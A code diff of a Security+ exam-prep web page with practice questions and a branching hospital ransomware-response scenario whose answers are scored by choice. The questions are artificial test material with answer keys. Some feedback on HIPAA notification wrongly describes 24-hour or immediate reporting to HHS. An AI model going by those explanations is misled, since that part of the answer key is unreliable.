@@ -5,110 +5,56 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Interactive Labs | Security+ SY0-701</title>
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:wght@300;400;500;600&family=Rajdhani:wght@400;500;600;700&family=Courier+Prime:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-
 <style>
-/* ════════════════════════════════════════════════
-   SHARED HUB STYLES
-   ════════════════════════════════════════════════ */
+
+/* ══════════════════════════════════════════
+   SHARED HUB
+══════════════════════════════════════════ */
 :root {
-  --bg: #0b0e17;
-  --bg2: #111520;
-  --bg3: #181d2e;
-  --border: #1f2740;
-  --accent: #00d4ff;
-  --accent2: #ff6b2b;
-  --green: #00f5a0;
-  --red: #ff4757;
-  --yellow: #ffd32a;
-  --purple: #b47aff;
-  --text: #d0d8f0;
-  --muted: #5a6a8a;
-  --font: 'IBM Plex Sans', sans-serif;
-  --mono: 'IBM Plex Mono', monospace;
+  --bg: #0b0e17; --bg2: #111520; --bg3: #181d2e;
+  --border: #1f2740; --accent: #00d4ff; --accent2: #ff6b2b;
+  --green: #00f5a0; --red: #ff4757; --yellow: #ffd32a; --purple: #b47aff;
+  --text: #d0d8f0; --muted: #5a6a8a;
+  --font: 'IBM Plex Sans', sans-serif; --mono: 'IBM Plex Mono', monospace;
 }
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:var(--bg); color:var(--text); font-family:var(--font); min-height:100vh; display:flex; flex-direction:column; overflow-x:hidden; }
 
-* { margin: 0; padding: 0; box-sizing: border-box; }
-
-body {
-  background: var(--bg);
-  color: var(--text);
-  font-family: var(--font);
-  min-height: 100vh;
-  line-height: 1.6;
-  display: flex;
-  flex-direction: column;
-}
-
-/* ── HUB HEADER ── */
 .hub-header {
-  background: var(--bg2);
-  border-bottom: 1px solid var(--border);
-  padding: 0 2rem;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  height: 70px;
-  position: sticky;
-  top: 0;
-  z-index: 200;
+  background:var(--bg2); border-bottom:1px solid var(--border);
+  padding:0 2rem; height:68px; display:flex; align-items:center;
+  justify-content:space-between; position:sticky; top:0; z-index:200;
 }
+.hub-logo { font-family:var(--mono); font-size:0.82rem; color:var(--muted); letter-spacing:0.1em; text-decoration:none; }
+.hub-logo span { color:var(--accent); }
+.hub-back { font-family:var(--mono); font-size:0.72rem; color:var(--muted); text-decoration:none; border:1px solid var(--border); padding:0.4rem 0.85rem; border-radius:5px; transition:all 0.2s; }
+.hub-back:hover { color:var(--accent); border-color:var(--accent); }
 
-.hub-logo {
-  font-family: var(--mono);
-  font-size: 0.85rem;
-  color: var(--muted);
-  letter-spacing: 0.1em;
-  text-decoration: none;
-}
-.hub-logo span { color: var(--accent); }
-
-.hub-back {
-  font-family: var(--mono);
-  font-size: 0.75rem;
-  color: var(--muted);
-  text-decoration: none;
-  border: 1px solid var(--border);
-  padding: 0.4rem 0.9rem;
-  border-radius: 6px;
-  transition: all 0.2s;
-  letter-spacing: 0.05em;
-}
-.hub-back:hover { color: var(--accent); border-color: var(--accent); }
-
-/* ── HUB TABS ── */
 .hub-tabs {
-  background: var(--bg2);
-  border-bottom: 1px solid var(--border);
-  display: flex;
-  gap: 0;
-  overflow-x: auto;
-  padding: 0 2rem;
+  background:var(--bg2); border-bottom:1px solid var(--border);
+  display:flex; overflow-x:auto; padding:0 2rem;
 }
-
 .hub-tab {
-  padding: 1rem 1.75rem;
-  background: none;
-  border: none;
-  border-bottom: 3px solid transparent;
-  color: var(--muted);
-  font-family: var(--mono);
-  font-size: 0.82rem;
-  cursor: pointer;
-  transition: all 0.25s;
-  white-space: nowrap;
-  letter-spacing: 0.05em;
-  text-transform: uppercase;
+  padding:1rem 1.75rem; background:none; border:none;
+  border-bottom:3px solid transparent; color:var(--muted);
+  font-family:var(--mono); font-size:0.82rem; cursor:pointer;
+  transition:all 0.2s; white-space:nowrap; letter-spacing:0.05em; text-transform:uppercase;
 }
-.hub-tab:hover { color: var(--text); }
-.hub-tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+.hub-tab:hover { color:var(--text); }
+.hub-tab.active { color:var(--accent); border-bottom-color:var(--accent); }
 
-/* ── HUB SECTIONS ── */
-.hub-section { display: none; flex: 1; }
-.hub-section.active { display: block; }
+.hub-section { display:none; flex:1; }
+.hub-section.active { display:block; }
 
-/* ════════════════════════════════════════════════
+@media (max-width:768px) {
+  .hub-tabs { padding:0 0.5rem; }
+  .hub-header { padding:0 1rem; }
+  .hub-logo-text { display:none; }
+}
+
+/* ══════════════════════════════════════════
    PBQ SIMULATOR STYLES
-   ════════════════════════════════════════════════ */
+══════════════════════════════════════════ */
 
   :root {
     --bg: #0b0e17;
@@ -801,24 +747,9 @@ body {
 
 
 
-/* ════════════════════════════════════════════════
-   CYBER SIMULATIONS STYLES (namespaced via wrapper)
-   ════════════════════════════════════════════════ */
-#section-sim {
-  --bg: #0a0e1a;
-  --bg2: #0f1419;
-  --bg3: #151b26;
-  --terminal-bg: #000000;
-  --border: #1a2332;
-  --accent: #00ff9f;
-  --accent2: #00d4ff;
-  --warning: #ffaa00;
-  --danger: #ff3366;
-  --success: #00ff9f;
-  --text: #e0e6f0;
-  --muted: #6b7d9f;
-  font-family: 'Courier Prime', monospace;
-}
+/* ══════════════════════════════════════════
+   CYBER SIMULATIONS STYLES
+══════════════════════════════════════════ */
 
   :root {
     --bg: #0a0e1a;
@@ -1463,24 +1394,16 @@ body {
   }
 
 
-/* ════════════════════════════════════════════════
-   BRANCHING SCENARIOS STYLES
-   ════════════════════════════════════════════════ */
-#section-branch {
-  --bg: #080b12;
-  --bg2: #0d1017;
-  --bg3: #121620;
-  --bg4: #171c28;
-  --border: #1a2135;
-  --accent: #00d4ff;
-  --green: #00f5a0;
-  --red: #ff4757;
-  --yellow: #ffd32a;
-  --orange: #ff6b35;
-  --text: #cdd5e8;
-  --muted: #4a5878;
-  font-family: 'IBM Plex Sans', sans-serif;
+/* Scanline overlay for sim section */
+#section-sim body::after, #section-sim::after {
+  content:''; position:fixed; inset:0;
+  background: repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.02) 2px,rgba(0,0,0,0.02) 4px);
+  pointer-events:none; z-index:0;
 }
+
+/* ══════════════════════════════════════════
+   BRANCHING SCENARIOS STYLES
+══════════════════════════════════════════ */
 
   :root {
     --bg:      #080b12;
@@ -1914,51 +1837,69 @@ body {
   }
 
 
-/* ── SCANLINE for branch section only ── */
-#section-branch::after {
-  content: '';
-  position: fixed;
-  inset: 0;
-  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
-  pointer-events: none;
-  z-index: 9999;
-}
-
-@media (max-width: 768px) {
-  .hub-tabs { padding: 0 1rem; }
-  .hub-header { padding: 0 1rem; }
-}
 </style>
 </head>
 <body>
 
-<!-- ══ UNIFIED HEADER ══ -->
+<!-- ══ HEADER ══ -->
 <header class="hub-header">
-  <a href="index.html" class="hub-logo">SECURITY+ <span>SY0-701</span> INTERACTIVE LABS</a>
+  <a href="index.html" class="hub-logo">SECURITY+ <span>SY0-701</span> <span class="hub-logo-text">· INTERACTIVE LABS</span></a>
   <a href="index.html" class="hub-back">← HOME</a>
 </header>
 
-<!-- ══ HUB NAVIGATION ══ -->
+<!-- ══ TAB NAV ══ -->
 <nav class="hub-tabs" id="hubTabs">
-  <button class="hub-tab active" onclick="switchHub('pbq', this)">🎯 PBQ Simulator</button>
-  <button class="hub-tab" onclick="switchHub('sim', this)">🖥️ Cyber Simulations</button>
-  <button class="hub-tab" onclick="switchHub('branch', this)">🌿 Branching Scenarios</button>
+  <button class="hub-tab active"  onclick="switchHub('pbq',    this)">🎯 PBQ Simulator</button>
+  <button class="hub-tab"         onclick="switchHub('sim',    this)">🖥️ Cyber Simulations</button>
+  <button class="hub-tab"         onclick="switchHub('branch', this)">🌿 Branching Scenarios</button>
 </nav>
 
-<!-- ══════════════════════════════════════════════
-     SECTION 1: PBQ SIMULATOR
-     ══════════════════════════════════════════════ -->
+
+<!-- ═══════════════════════════════════════════════════
+     TAB 1 · PBQ SIMULATOR
+═══════════════════════════════════════════════════ -->
 <div class="hub-section active" id="section-pbq">
+<header style="background:var(--bg2);border-bottom:1px solid var(--border);padding:0 2rem;display:flex;align-items:center;justify-content:space-between;height:60px;">
+  <a href="index.html" class="logo">SECURITY+ <span>SY0-701</span> PRACTICE EXAMS</a>
+  <div class="header-right" style="display:flex;align-items:center;gap:1.5rem;">
+    <div class="score-pills">
+      <div class="score-pill"><span class="val" id="score-correct">0</span><span class="lbl">correct</span></div>
+      <div class="score-pill"><span class="val" id="score-attempts">0</span><span class="lbl">attempts</span></div>
+    </div>
+  </div>
+</header>
 <main>
 <div class="container">
   <h1>Performance-Based Questions</h1>
   <p class="subtitle">// drag-and-drop interactive simulations · SY0-701</p>
+  <div class="pbq-progress">
+    <span class="pbq-progress-label">PBQ PROGRESS</span>
+    <div class="pbq-progress-bar"><div class="pbq-progress-fill" id="prog-fill" style="width:12.5%"></div></div>
+    <span class="pbq-progress-score" id="prog-label">1 / 8</span>
+  </div>
+  <div class="nav-tabs">
+    <button class="nav-tab active" onclick="switchTab('acl',this,1)">🛡️ Firewall ACL</button>
+    <button class="nav-tab" onclick="switchTab('net',this,2)">🌐 Network Diagram</button>
+    <button class="nav-tab" onclick="switchTab('log',this,3)">📋 Log Analysis</button>
+    <button class="nav-tab" onclick="switchTab('ir',this,4)">🚨 Incident Response</button>
+    <button class="nav-tab" onclick="switchTab('ports',this,5)">🔌 Port Matching</button>
+    <button class="nav-tab" onclick="switchTab('crypto',this,6)">🔐 Cryptography</button>
+    <button class="nav-tab" onclick="switchTab('vuln',this,7)">🎯 Vuln Prioritization</button>
+    <button class="nav-tab" onclick="switchTab('iam',this,8)">👤 Access Control</button>
+  </div>
+
+<div class="container">
+
+  <h1>Performance-Based Questions</h1>
+  <p class="subtitle">// drag-and-drop interactive simulations · SY0-701</p>
+
   <!-- Progress -->
   <div class="pbq-progress">
     <span class="pbq-progress-label">PBQ PROGRESS</span>
     <div class="pbq-progress-bar"><div class="pbq-progress-fill" id="prog-fill" style="width:12.5%"></div></div>
     <span class="pbq-progress-score" id="prog-label">1 / 8</span>
   </div>
+
   <!-- NAV TABS -->
   <div class="nav-tabs">
     <button class="nav-tab active" onclick="switchTab('acl',this,1)">🛡️ Firewall ACL</button>
@@ -2396,23 +2337,24 @@ body {
     </div>
   </div>
 
+</div>
 
 </div>
 </main>
-<footer style="padding:1.5rem 2rem;text-align:center;color:var(--muted);font-size:0.85rem;font-family:var(--mono);border-top:1px solid var(--border);">
+<footer style="padding:1.5rem 2rem;text-align:center;color:var(--muted);font-size:0.82rem;font-family:var(--mono);border-top:1px solid var(--border);">
   <p>CompTIA Security+ SY0-701 · Performance-Based Question Simulator</p>
-  <p style="margin-top:0.4rem;font-size:0.75rem;"><a href="disclaimer.html" style="color:var(--accent);text-decoration:none;border-bottom:1px dotted var(--accent);">Disclaimer &amp; Legal Notice</a></p>
+  <p style="margin-top:0.4rem; font-size:0.75rem;"><a href="disclaimer.html" style="color:var(--accent);text-decoration:none;border-bottom:1px dotted var(--accent);">Disclaimer &amp; Legal Notice</a></p>
 </footer>
 </div>
 
-<!-- ══════════════════════════════════════════════
-     SECTION 2: CYBER SIMULATIONS
-     ══════════════════════════════════════════════ -->
+
+<!-- ═══════════════════════════════════════════════════
+     TAB 2 · CYBER SIMULATIONS
+═══════════════════════════════════════════════════ -->
 <div class="hub-section" id="section-sim">
 <main style="position:relative;z-index:1;padding:2rem;max-width:1400px;margin:0 auto;">
-  <!-- Intro Section -->
   <div class="intro-section" id="simIntroSection">
-    <h1 style="font-family:'Share Tech Mono',monospace;color:var(--accent);text-shadow:0 0 20px rgba(0,255,159,0.5);">Interactive Security Simulations</h1>
+    <h1>Interactive Security Simulations</h1>
     <p class="subtitle">Practice real-world cybersecurity scenarios with hands-on decision making</p>
     <div class="scenario-selector">
       <div class="scenario-card" data-scenario="phishing">
@@ -2453,15 +2395,16 @@ body {
       </div>
     </div>
   </div>
-  <!-- Simulation Container -->
   <div class="simulation-container" id="simulationContainer"></div>
 </main>
 </div>
 
-<!-- ══════════════════════════════════════════════
-     SECTION 3: BRANCHING SCENARIOS
-     ══════════════════════════════════════════════ -->
+
+<!-- ═══════════════════════════════════════════════════
+     TAB 3 · BRANCHING SCENARIOS
+═══════════════════════════════════════════════════ -->
 <div class="hub-section" id="section-branch">
+
   <!-- SCENARIO SELECT -->
   <div id="scenarioSelect">
     <main>
@@ -2469,47 +2412,65 @@ body {
         <h1>Choose Your <span>Scenario</span></h1>
         <p>// branching simulations — your decisions shape the outcome</p>
       </div>
+
       <div class="scenarios-grid">
+        <!-- Active scenario -->
         <div class="scenario-card" onclick="startScenario('midnight_breach')">
-          <div class="card-top"><div class="card-icon">🌙</div><div class="card-diff diff-hard">Hard</div></div>
+          <div class="card-top">
+            <div class="card-icon">🌙</div>
+            <div class="card-diff diff-hard">Hard</div>
+          </div>
           <div class="card-title">The Midnight Breach</div>
           <div class="card-subtitle">Ransomware Incident Response</div>
           <div class="card-desc">It's 2:47 AM. Three hospital servers are encrypting simultaneously. Your manager is calling. Every decision you make in the next 5 hours determines whether the breach is contained — or catastrophic.</div>
           <div class="card-meta">
-            <div class="meta-item">Domain: <span>IR &amp; Operations</span></div>
+            <div class="meta-item">Domain: <span>IR & Operations</span></div>
             <div class="meta-item">Time: <span>10-15 min</span></div>
           </div>
           <div class="card-cta">▶ Start Scenario →</div>
         </div>
+
+        <!-- Coming soon cards -->
         <div class="scenario-card" onclick="startScenario('phishing_campaign')">
-          <div class="card-top"><div class="card-icon">🎣</div><div class="card-diff diff-medium">Medium</div></div>
+          <div class="card-top">
+            <div class="card-icon">🎣</div>
+            <div class="card-diff diff-medium">Medium</div>
+          </div>
           <div class="card-title">The Phishing Campaign</div>
           <div class="card-subtitle">Social Engineering Response</div>
           <div class="card-desc">A targeted spearphishing campaign is hitting your executives. Credential harvesting, BEC attempts, and a potential wire transfer fraud — can you stop it in time?</div>
           <div class="card-meta">
-            <div class="meta-item">Domain: <span>Threats &amp; Attacks</span></div>
+            <div class="meta-item">Domain: <span>Threats & Attacks</span></div>
             <div class="meta-item">Time: <span>8-12 min</span></div>
           </div>
           <div class="card-cta">▶ Start Scenario →</div>
         </div>
+
         <div class="scenario-card" onclick="startScenario('insider_threat')">
-          <div class="card-top"><div class="card-icon">👤</div><div class="card-diff diff-medium">Medium</div></div>
+          <div class="card-top">
+            <div class="card-icon">👤</div>
+            <div class="card-diff diff-medium">Medium</div>
+          </div>
           <div class="card-title">The Insider Threat</div>
-          <div class="card-subtitle">Access Controls &amp; Monitoring</div>
+          <div class="card-subtitle">Access Controls & Monitoring</div>
           <div class="card-desc">A disgruntled employee with elevated privileges is exfiltrating sensitive data. Monitoring logs suggest it's been happening for weeks. How do you handle it without tipping them off?</div>
           <div class="card-meta">
-            <div class="meta-item">Domain: <span>Identity &amp; Access</span></div>
+            <div class="meta-item">Domain: <span>Identity & Access</span></div>
             <div class="meta-item">Time: <span>8-12 min</span></div>
           </div>
           <div class="card-cta">▶ Start Scenario →</div>
         </div>
+
         <div class="scenario-card" onclick="startScenario('cloud_misconfiguration')">
-          <div class="card-top"><div class="card-icon">☁️</div><div class="card-diff diff-medium">Medium</div></div>
+          <div class="card-top">
+            <div class="card-icon">☁️</div>
+            <div class="card-diff diff-medium">Medium</div>
+          </div>
           <div class="card-title">Cloud Misconfiguration</div>
-          <div class="card-subtitle">Cloud Security &amp; Data Exposure</div>
+          <div class="card-subtitle">Cloud Security & Data Exposure</div>
           <div class="card-desc">A misconfigured S3 bucket has exposed 52,000 customer records. A security researcher found it and Reddit is sharing the link. You have 48 hours before it goes public.</div>
           <div class="card-meta">
-            <div class="meta-item">Domain: <span>Architecture &amp; Design</span></div>
+            <div class="meta-item">Domain: <span>Architecture & Design</span></div>
             <div class="meta-item">Time: <span>8-12 min</span></div>
           </div>
           <div class="card-cta">▶ Start Scenario →</div>
@@ -2519,9 +2480,10 @@ body {
   </div>
 
   <!-- GAME AREA -->
-  <div id="gameArea" style="display:none;">
+  <div id="gameArea">
     <main>
       <div class="game-layout">
+        <!-- Sidebar -->
         <div class="sidebar">
           <div class="sidebar-header">// Active Scenario</div>
           <div class="scenario-info">
@@ -2530,7 +2492,9 @@ body {
           </div>
           <div class="threat-section">
             <div class="threat-label">Threat Level</div>
-            <div class="threat-bar-wrap"><div class="threat-bar" id="threatBar" style="width:20%"></div></div>
+            <div class="threat-bar-wrap">
+              <div class="threat-bar" id="threatBar" style="width:20%"></div>
+            </div>
             <div class="threat-text" id="threatText" style="color:var(--green)">LOW</div>
           </div>
           <div class="score-section">
@@ -2542,20 +2506,28 @@ body {
             <div class="steps-list" id="stepsList"></div>
           </div>
         </div>
+
+        <!-- Game Panel -->
         <div class="game-panel">
           <div class="timestamp-bar">
             <div class="ts-time" id="tsTime">—</div>
             <div class="ts-role" id="tsRole">—</div>
             <div class="ts-location">MedCorp Regional Hospital</div>
           </div>
+
           <div class="situation-box">
-            <div class="sit-header"><div class="sit-label">Situation Update</div><div class="sit-divider"></div></div>
+            <div class="sit-header">
+              <div class="sit-label">Situation Update</div>
+              <div class="sit-divider"></div>
+            </div>
             <div class="sit-body" id="situationText">Loading...</div>
           </div>
+
           <div class="consequence-banner" id="consequenceBanner">
             <div class="banner-tag" id="bannerTag"></div>
             <div id="bannerText"></div>
           </div>
+
           <div class="question-box">
             <div class="q-label">// Decision Required</div>
             <div class="q-text" id="questionText">—</div>
@@ -2568,7 +2540,7 @@ body {
   </div>
 
   <!-- DEBRIEF -->
-  <div id="debriefArea" style="display:none;">
+  <div id="debriefArea">
     <main>
       <div class="debrief-wrap">
         <div class="debrief-hero">
@@ -2580,32 +2552,38 @@ body {
           <div class="debrief-message" id="debriefMessage">—</div>
           <div class="outcome-banner" id="outcomeBanner"></div>
         </div>
+
         <div class="debrief-sections">
           <div class="debrief-section">
             <div class="ds-header">// Your Decision History</div>
             <div class="ds-body" id="decisionHistory"></div>
           </div>
+
           <div class="debrief-section">
             <div class="ds-header">// Key Security+ Concepts Tested</div>
-            <div class="ds-body"><div class="key-concepts" id="keyConcepts"></div></div>
+            <div class="ds-body">
+              <div class="key-concepts" id="keyConcepts"></div>
+            </div>
           </div>
         </div>
+
         <div class="debrief-actions">
           <button class="action-btn action-primary" onclick="retryScenario()">↺ Retry Scenario</button>
           <button class="action-btn action-secondary" onclick="backToSelect()">← All Scenarios</button>
-          <button class="action-btn action-secondary" onclick="switchHub('branch', document.querySelectorAll('.hub-tab')[2])">⌂ Lab Home</button>
+          <button class="action-btn action-secondary" onclick="location.href='index.html'">⌂ Home</button>
         </div>
       </div>
     </main>
   </div>
+
 </div>
 
-<!-- ══ SHARED SCRIPTS ══ -->
 
+<!-- ═══════════════════════════════════════════════════
+     SCRIPTS
+═══════════════════════════════════════════════════ -->
 <script>
-// ════════════════════════════════════════════════
-// HUB NAVIGATION
-// ════════════════════════════════════════════════
+// ── HUB NAVIGATION ──
 function switchHub(id, btn) {
   document.querySelectorAll('.hub-section').forEach(s => s.classList.remove('active'));
   document.querySelectorAll('.hub-tab').forEach(b => b.classList.remove('active'));
@@ -2613,10 +2591,716 @@ function switchHub(id, btn) {
   btn.classList.add('active');
   window.scrollTo({ top: 0, behavior: 'smooth' });
 }
+</script>
 
-// ════════════════════════════════════════════════
-// PBQ SIMULATOR JS
-// ════════════════════════════════════════════════
+<script>
+
+// ═══════════════════════════════════════════════════════
+// SCENARIO DATA  (replaces scenario-data.js)
+// ═══════════════════════════════════════════════════════
+const SCORE_BANDS = {
+  optimal: { label: 'ELITE RESPONDER',   color: '#00f5a0', desc: 'Outstanding decisions under pressure. Threat contained with minimal impact.' },
+  good:    { label: 'COMPETENT ANALYST', color: '#00d4ff', desc: 'Solid response. A few missteps but the core threat was handled effectively.' },
+  partial: { label: 'JUNIOR ANALYST',    color: '#ffd32a', desc: 'Mixed results. Key decisions were suboptimal and increased damage. Review debrief.' },
+  poor:    { label: 'NEEDS TRAINING',    color: '#ff4757', desc: 'Critical errors allowed the threat to escalate. Study the IR lifecycle and retry.' }
+};
+
+const SCENARIOS = {
+  midnight_breach: {
+    id: 'midnight_breach',
+    title: 'The Midnight Breach',
+    roles: 'SOC Analyst / Incident Responder',
+    intro: "It's 2:47 AM. Your pager goes off. Three servers in the hospital's patient records wing are showing abnormal encryption activity. The SIEM is lighting up. Your manager is calling. This is real.",
+    nodes: {
+      start: {
+        timeStamp: '02:47 AM', threatLevel: 1,
+        situation: "SIEM alert: three servers (MEDCORP-SRV-04, 05, 06) showing mass file encryption events. Unusual outbound traffic to 185.220.101.x (known Tor exit node). No confirmed ransomware note yet.",
+        question: "What is your FIRST action?",
+        choices: [
+          { text: "Immediately isolate all three servers from the network",       tag: "Containment first",      outcome: "Smart. Cutting network access stops the ransomware from spreading and communicating with its C2 server.",                                                            points: 30, next: "n2_isolated" },
+          { text: "Wake up the CISO and wait for authorization before acting",    tag: "Escalate first",         outcome: "Escalation is important but ransomware doesn't wait. Precious minutes lost while it continues encrypting.",                                                        points: 10, next: "n2_waited"   },
+          { text: "Run antivirus scan on all three servers",                       tag: "AV scan",               outcome: "AV won't stop active encryption in progress and may tip off the malware. Wrong tool for an active incident.",                                                      points:  5, next: "n2_avscanned"},
+          { text: "Pull network cables and call your forensics team simultaneously",tag:"Isolate + Escalate",    outcome: "Excellent. Immediate isolation stops spread while getting the right people moving in parallel.",                                                                   points: 35, next: "n2_isolated" }
+        ]
+      },
+      n2_isolated: {
+        timeStamp: '02:53 AM', threatLevel: 2,
+        situation: "Servers isolated. Encryption stopped. Ransom note found: 'Pay 15 BTC within 72 hours.' Attack vector: compromised vendor VPN account.",
+        question: "The attacker used a vendor VPN account. What do you do with vendor access?",
+        choices: [
+          { text: "Disable ALL vendor/third-party VPN accounts immediately",      tag: "Aggressive lockdown",    outcome: "Correct. You don't know which other accounts may be compromised. Disable all until audited.",                                                                       points: 35, next: "n3_vendor_locked"  },
+          { text: "Disable only the specific compromised vendor account",          tag: "Targeted response",     outcome: "Too narrow. The attacker may have pivoted to other vendor accounts.",                                                                                              points: 15, next: "n3_vendor_partial" },
+          { text: "Force password resets on all vendor accounts",                  tag: "Password reset",        outcome: "Better than nothing, but active sessions may persist. Disable is safer than reset during an active incident.",                                                    points: 20, next: "n3_vendor_partial" },
+          { text: "Leave vendor access to monitor attacker movement",              tag: "Honeypot tactic",       outcome: "Risky without proper monitoring infrastructure. Attacker retains access to your environment.",                                                                    points:  5, next: "n3_vendor_partial" }
+        ]
+      },
+      n2_waited: {
+        timeStamp: '02:53 AM', threatLevel: 3,
+        situation: "15 minutes waiting for authorization. Two more servers encrypted via network shares. Ransom demand escalated to 25 BTC.",
+        question: "The spread has escalated. What now?",
+        choices: [
+          { text: "Emergency network segment shutdown — isolate entire affected VLAN", tag: "Emergency containment", outcome: "Correct action, though delayed. Isolate now to stop further spread.",                                                                                       points: 20, next: "n3_vendor_locked"  },
+          { text: "Disconnect the entire hospital network to be safe",                 tag: "Full shutdown",         outcome: "Too aggressive. Disconnecting all hospital systems risks patient safety for unaffected systems.",                                                             points: 10, next: "n3_vendor_partial" },
+          { text: "Pay the ransom to recover files quickly",                           tag: "Pay ransom",            outcome: "Never recommended. No guarantee of decryption, funds criminals, and you remain compromised.",                                                               points:  0, next: "n3_vendor_partial" },
+          { text: "Isolate affected servers and begin incident response protocol",     tag: "Structured IR",         outcome: "Right direction. Late but correct — execute containment and follow the IR lifecycle.",                                                                      points: 25, next: "n3_vendor_locked"  }
+        ]
+      },
+      n2_avscanned: {
+        timeStamp: '02:53 AM', threatLevel: 3,
+        situation: "The AV scan triggered ransomware's detection logic. It accelerated encryption and deleted shadow copies. Three more servers encrypted.",
+        question: "Situation worsened. How do you stop the spread now?",
+        choices: [
+          { text: "Immediately isolate all affected servers and connected network segments", tag: "Emergency isolation",    outcome: "Correct — better late than never. Cut network access immediately.",                                                                                  points: 20, next: "n3_vendor_locked"  },
+          { text: "Run a different antivirus with updated signatures",                       tag: "More AV scans",         outcome: "Still wrong. Active threat requires network isolation, not scanning.",                                                                                points:  0, next: "n3_vendor_partial" },
+          { text: "Restore from backups immediately",                                        tag: "Restore now",           outcome: "Recovery before containment means restored systems will be reinfected.",                                                                             points:  5, next: "n3_vendor_partial" },
+          { text: "Pull network cables on affected servers, notify management",              tag: "Physical isolation",    outcome: "Physical isolation is effective. Get management involved given the escalation.",                                                                      points: 25, next: "n3_vendor_locked"  }
+        ]
+      },
+      n3_vendor_locked: {
+        timeStamp: '03:15 AM', threatLevel: 2,
+        situation: "Vendor access locked. Forensics team online. VSS (Volume Shadow Copies) were deleted by ransomware. Offline backups available from 2 days ago.",
+        question: "What should happen BEFORE any remediation on the encrypted servers?",
+        choices: [
+          { text: "Create forensic disk images of all affected servers before touching anything", tag: "Preserve evidence",    outcome: "Critical. Forensic images preserve evidence for investigation, legal proceedings, and root cause.",                                                   points: 35, next: "n4_remediate" },
+          { text: "Immediately wipe and restore from backups to minimize downtime",              tag: "Fast recovery",        outcome: "Destroying evidence before analysis is a critical error. You lose the ability to understand the full breach scope.",                                 points:  5, next: "n4_remediate" },
+          { text: "Attempt decryption using known ransomware decryptors",                        tag: "Decrypt first",        outcome: "Check decryptors — but only on a copy, never on the only version. Forensic imaging comes first.",                                                   points: 15, next: "n4_remediate" },
+          { text: "Preserve images AND start backup restoration on unaffected systems in parallel",tag:"Parallel approach",   outcome: "Excellent. Preserve evidence on affected systems while starting recovery on clean systems simultaneously.",                                          points: 40, next: "n4_remediate" }
+        ]
+      },
+      n3_vendor_partial: {
+        timeStamp: '03:15 AM', threatLevel: 3,
+        situation: "Vendor access partially addressed. Encrypted servers still hold forensic evidence. VSS deleted by ransomware.",
+        question: "What is the most important thing to do with the encrypted servers RIGHT NOW?",
+        choices: [
+          { text: "Create forensic disk images before any other action",                       tag: "Evidence preservation",  outcome: "Correct. Even with delays, preserving forensic evidence now is critical before remediation.",                                                         points: 30, next: "n4_remediate" },
+          { text: "Wipe and restore — you need systems back online fast",                      tag: "Skip forensics",         outcome: "Wiping evidence is a serious mistake. You can't understand the full scope of the breach.",                                                          points:  5, next: "n4_remediate" },
+          { text: "Pay the ransom to recover files",                                           tag: "Pay ransom",             outcome: "Not recommended. Funds criminals and doesn't guarantee decryption.",                                                                               points:  0, next: "n4_remediate" },
+          { text: "Image the drives and block outbound traffic to Tor exit nodes",             tag: "Evidence + network",     outcome: "Good combination — preserve evidence and cut off C2 communication channels.",                                                                       points: 35, next: "n4_remediate" }
+        ]
+      },
+      n4_remediate: {
+        timeStamp: '04:30 AM', threatLevel: 2,
+        situation: "Forensic images captured. Analysis: initial access via vendor VPN → lateral movement via PsExec → ransomware via scheduled task. Patient records affected. HIPAA breach notification triggered.",
+        question: "HIPAA requires breach notification. What is the timeline for notifying affected patients?",
+        choices: [
+          { text: "Within 60 days of discovering the breach", tag: "HIPAA Rule",   outcome: "Correct. HIPAA Breach Notification Rule: notify affected individuals within 60 days of discovery.",                                                                                      points: 30, next: "n5_final" },
+          { text: "Within 24 hours",                          tag: "24 hours",     outcome: "24 hours is for HIPAA security incidents to HHS if 500+ affected in same state. Patient notification is 60 days.",                                                                        points: 10, next: "n5_final" },
+          { text: "Within 30 days",                           tag: "30 days",      outcome: "Close but incorrect. HIPAA requires 60 days for patient notification, not 30.",                                                                                                           points: 15, next: "n5_final" },
+          { text: "Immediately — same day",                   tag: "Same day",     outcome: "Not the HIPAA standard. 60 days for patient notification. HHS reporting immediately for 500+ in same state.",                                                                             points:  5, next: "n5_final" }
+        ]
+      },
+      n5_final: {
+        timeStamp: '06:00 AM', threatLevel: 1,
+        situation: "Threat contained. Recovery underway. Management wants long-term controls to prevent recurrence.",
+        question: "Which control set BEST prevents this attack from recurring?",
+        choices: [
+          { text: "MFA on all VPN access + network segmentation + immutable offline backups + EDR", tag: "Layered defense",   outcome: "Perfect. Addresses root cause (VPN), limits lateral movement (segmentation), ensures recovery (backups), detects future threats (EDR).",             points: 40, next: "terminal_good"    },
+          { text: "Change all vendor passwords and increase firewall rules",                         tag: "Basic hardening",  outcome: "Helpful but insufficient. Doesn't address MFA, segmentation, or backup gaps.",                                                                    points: 15, next: "terminal_partial" },
+          { text: "Purchase cyber insurance to cover future ransomware incidents",                   tag: "Insurance only",   outcome: "Insurance helps costs but does nothing to prevent the attack.",                                                                                  points:  5, next: "terminal_bad"     },
+          { text: "Deploy email filtering (most common ransomware vector)",                          tag: "Email security",   outcome: "Good control, but this attack came through VPN — address the actual vector.",                                                                    points: 10, next: "terminal_partial" }
+        ]
+      },
+      terminal_good:    { isTerminal: true, terminalType: 'good',    message: "Incident contained with minimal patient impact. Forensic evidence preserved. HIPAA notification filed. New controls prevent recurrence. Hospital operations restored within 18 hours." },
+      terminal_partial: { isTerminal: true, terminalType: 'partial', message: "Incident contained but gaps remain. Some evidence lost. Basic controls added but comprehensive hardening incomplete. Elevated risk of repeat breach within 12 months." },
+      terminal_bad:     { isTerminal: true, terminalType: 'bad',     message: "Serious missteps throughout. Evidence destroyed, scope unknown, root cause unresolved. Hospital highly vulnerable to repeat attack." }
+    }
+  },
+
+  phishing_campaign: {
+    id: 'phishing_campaign',
+    title: 'The Phishing Campaign',
+    roles: 'Security Analyst / IR Lead',
+    intro: "Monday morning. Three executives forwarded suspicious emails. Your gateway flagged 47 similar messages in 2 hours. The CFO says she almost clicked a link. This is a targeted campaign.",
+    nodes: {
+      start: {
+        timeStamp: '08:15 AM', threatLevel: 2,
